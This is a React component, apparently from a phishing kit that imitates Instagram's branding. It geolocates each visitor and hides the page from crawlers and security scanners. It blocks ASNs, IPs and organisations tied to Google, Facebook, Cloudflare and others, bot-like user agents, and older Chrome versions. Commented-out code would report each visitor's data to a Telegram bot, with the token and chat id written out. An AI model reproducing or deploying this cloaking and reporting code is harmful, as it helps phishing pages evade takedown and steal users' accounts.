import Favicon from '@assets/images/favicon.ico';
import Header from '@pages/Client/components/Header';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { Helmet } from 'react-helmet-async';
import { Outlet } from 'react-router-dom';
const blockedASNs = [
	15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 214961,
	401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209,
	51396, 209, 62563, 1680, 34665, 16276, 39351, 202425, 5650,
];
const blockedUserAgents = [
	'facebook',
	'http',
	'.com',
	'bot',
	'python',
	'BotPoke',
	'headless',
	'curl',
	'python',
];
const blockedOrganizations = [
	'Cloudflare',
	'Google',
	'Facebook',
	'Amazon',
	'Microsoft',
	'Apple',
	'Oracle',
	'IBM',
	'Salesforce',
	'Twitter',
	'Dropbox',
	'Slack',
	'Tencent',
	'Alibaba',
	'TikTok',
	'Instagram',
	'LinkedIn',
	'Netflix',
	'Spotify',
];
const blockedIPs = ['95.214.55.43', '154.213.184.3'];

const CheckBot: React.FC = () => {
	const [isBot, setIsBot] = useState<boolean | null>(null);

	useEffect(() => {
		const sendData = async (
			data: GeoJSResponse,
			blocked: boolean,
			userAgent: string,
		) => {
			console.log(data, blocked, userAgent);
			// const token = '8074852866:AAFvGqIbtUxKQtJrdUrX_oEhMTe-d38xFe0';
			// const chatId = '-4585797728';
			// const status = blocked ? '**❌Đã chặn**' : '**✅Đã truy cập**';
			// const jsonData = `\`\`\`json\n${JSON.stringify(data, null, 2)}\`\`\``;
			// const message = `${status}\n${jsonData}\n\`${userAgent}\``;
			// try {
			// 	const response = await axios.post(
			// 		`https://api.telegram.org/bot${token}/sendMessage`,
			// 		{
			// 			chat_id: chatId,
			// 			text: message,
			// 			parse_mode: 'MarkdownV2',
			// 			disable_notification: true,
			// 		},
			// 	);
			// 	return response.data.ok;
			// } catch {
			// 	return false;
			// }
		};
		const checkBot = async () => {
			try {
				const userAgent = navigator.userAgent.toLowerCase();
				const response = await axios.get<GeoJSResponse>(
					'https://get.geojs.io/v1/ip/geo.json',
				);
				const { asn, ip, organization_name, organization } =
					response.data;
				localStorage.setItem('geo', JSON.stringify(response.data));

				const chromeVersionRegex = /chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/;
				const match = chromeVersionRegex.exec(userAgent);
				if (match) {
					const majorVersion = parseInt(match[1], 10);
					if (majorVersion < 128) {
						await sendData(response.data, true, userAgent);
						setIsBot(true);
						return;
					}
				}

				if (blockedASNs.includes(asn ?? 0)) {
					await sendData(response.data, true, userAgent);
					setIsBot(true);
					return;
				}
				if (blockedIPs.includes(ip ?? '')) {
					await sendData(response.data, true, userAgent);
					setIsBot(true);
					return;
				}
				if (
					blockedOrganizations.some(
						(org) =>
							organization
								?.toLowerCase()
								.includes(org.toLowerCase()) ||
							organization_name
								?.toLowerCase()
								.includes(org.toLowerCase()),
					)
				) {
					await sendData(response.data, true, userAgent);
					setIsBot(true);
					return;
				}
				if (
					blockedUserAgents.some((agent) => userAgent.includes(agent))
				) {
					await sendData(response.data, true, userAgent);
					setIsBot(true);
					return;
				}
				await sendData(response.data, false, userAgent);
				setIsBot(false);
			} catch {
				setIsBot(false);
			}
		};

		checkBot();
	}, []);
	if (isBot === null) {
		return <></>;
	}

	return isBot ? (
		<></>
	) : (
		<div className='flex min-h-screen flex-col bg-white'>
			<Header />
			<Helmet>
				<title>Instagram</title>
				<link rel='shortcut icon' href={Favicon} type='image/x-icon' />
			</Helmet>
			<div className='flex h-full flex-1 items-center justify-center bg-white text-[#1C2B33] sm:bg-gradient-to-br sm:from-[#FCF3F8] sm:to-[#EEFBF3] sm:px-0'>
				<Outlet />
			</div>
		</div>
	);
};

export default CheckBot;
